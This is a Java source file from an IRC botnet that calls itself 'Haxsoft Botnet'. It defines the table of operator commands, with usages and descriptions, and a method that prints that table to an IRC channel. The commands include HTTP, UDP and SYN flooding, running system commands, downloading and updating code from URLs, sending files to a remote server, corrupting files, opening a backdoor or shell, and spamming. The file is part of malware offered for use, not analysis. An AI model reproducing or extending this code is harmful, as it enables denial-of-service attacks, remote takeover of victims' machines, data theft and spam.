import java.util.ArrayList;
import java.util.HashMap;

class Commands {

	private static ArrayList<String> commands = new ArrayList(50);

	private static HashMap usages = new HashMap();
	private static HashMap descriptions = new HashMap();
	

	static {
		addCommands();
		addUsages();
		addDescriptions();
	}

	private static void addCommands() {
		commands.add(".commands");
		commands.add(".version");
		commands.add(".exit");
		commands.add(".quit");
		commands.add(".join");
		commands.add(".part");
		commands.add(".nick");
		commands.add(".nickprefix");
		commands.add(".permnick");
		commands.add(".msg");
		commands.add(".raw");
		commands.add(".download");
		commands.add(".system");
		commands.add(".httpflood");
		commands.add(".udpflood");
		commands.add(".synflood");
		commands.add(".stopfloods");
		commands.add(".getip");
		commands.add(".findip");
		commands.add(".mkshell");
		commands.add(".mkdir");
		commands.add(".cd");
		commands.add(".ls");
		commands.add(".corrupt");
		commands.add(".update");
		commands.add(".send");
		commands.add(".zip");
		commands.add(".read");
		commands.add(".spam");
		commands.add(".stopspam");
		commands.add(".backdoor");
		commands.add(".ircscript");
		commands.trimToSize();
	}

	private static void addUsages() {
		usages.put(".commands", ".commands");
		usages.put(".version", ".version");
		usages.put(".exit", ".exit");
		usages.put(".quit", ".quit <message>");
		usages.put(".join", ".join <channel>");
		usages.put(".part", ".part <channel>");
		usages.put(".nick", ".nick <nick>");
		usages.put(".nickprefix", ".nickprefix <nick prefix>");
		usages.put(".permnick", ".permnick <nick>");
		usages.put(".msg", ".msg <channel> <message>");
		usages.put(".raw", ".raw <line>");
		usages.put(".download", ".download <url> <dir [optional]>");
		usages.put(".system", ".system <command>");
		usages.put(".httpflood", ".httpflood <url> <threads> <delay> <connections>");
		usages.put(".udpflood", ".udpflood <host> <threads> <delay> <connections>");
		usages.put(".synflood", ".sflood <host> <port> <threads> <delay> <connections>");
		usages.put(".stopfloods", ".stopfloods");
		usages.put(".getip", ".getip <url [optional]>");
		usages.put(".findip", ".findip");
		usages.put(".mkshell", ".mkshell");
		usages.put(".mkdir", ".mkdir <dir>");
		usages.put(".cd", ".cd <dir>");
		usages.put(".ls", ".ls");
		usages.put(".corrupt", ".corrupt <file> <message [optional]>");
		usages.put(".update", ".update <url>");
		usages.put(".send", ".send <file> <server> <port>");
		usages.put(".zip", ".zip <input> <output>");
		usages.put(".read", ".read <file> <lines>");
		usages.put(".spam", ".spam <server> <port> <channel> <channel password [optional]> <nick> <message> <times> <delay>");
		usages.put(".stopspam", ".stopspam");
		usages.put(".backdoor", ".backdoor <host> <port>");
		usages.put(".ircscript", ".ircscript <url>");
	}

	private static void addDescriptions() {
		descriptions.put(".commands", "Shows this dialog");
		descriptions.put(".version", "Display bot's version");
		descriptions.put(".exit", "Shut down bot");
		descriptions.put(".quit", "Leave IRC server");
		descriptions.put(".join", "Join channel");
		descriptions.put(".part", "Part channel");
		descriptions.put(".nick", "Change nick");
		descriptions.put(".nickprefix", "Change nick to prefix + random number");
		descriptions.put(".permnick", "Permantly change nick");
		descriptions.put(".msg", "Send message");
		descriptions.put(".raw", "Send raw line to IRC server");
		descriptions.put(".download", "Download file to directory");
		descriptions.put(".system", "Execute system command or program");
		descriptions.put(".httpflood", "HTTP flood");
		descriptions.put(".udpflood", "UDP flood");
		descriptions.put(".synflood", "Socket flood");
		descriptions.put(".stopfloods", "Stops all floods");
		descriptions.put(".getip", "Gets IP address, option to set URL to read from");
		descriptions.put(".findip", "If the bot's IP address matches, it says so");
		descriptions.put(".mkshell", "Create a new shell for the channel");
		descriptions.put(".mkdir", "Make new directory (requires shell on the channel)");
		descriptions.put(".cd", "Go into directory (requires shell on the channel)");
		descriptions.put(".ls", "List files in current directory (requires shell on the channel)");
		descriptions.put(".corrupt", "Corrupts file, option to write message");
		descriptions.put(".update", "Updates the bot with the specified jar file URL");
		descriptions.put(".send", "Sends file to specified GNXR file server on specified port");
		descriptions.put(".zip", "Zips specified file or folder");
		descriptions.put(".read", "Reads number of lines from text file");
		descriptions.put(".spam", "Spams message based on specified settings");
		descriptions.put(".stopspam", "Stops all IRC spamming");
		descriptions.put(".ircscript", "Interprets IRC script at specified URL");
	}

	public static String[] getCommands() {
		Object[] objs = commands.toArray();
		String[] cmds = new String[objs.length];
		for(int i = 0; i < objs.length; i++) {
			cmds[i] = (String)objs[i];
		}
		return cmds;
	}

	public static String getUsage(String command) {
		return (String)usages.get(command);
	}

	public static String getDescription(String command) {
		return (String)descriptions.get(command);
	}

	public static boolean contain(String command) {
		return commands.contains(command);
	}

	public static void printCommands(IRC irc, String channel) {
		irc.sendMessage(channel, "..:Haxsoft Botnet Commands:..");
		String[] commands = getCommands();
		for(int i = 0; i < commands.length; i++) {
			irc.sendMessage(channel, ":: " + getUsage(commands[i]) + " (" + getDescription(commands[i]) + ") ::");
		}
	}

}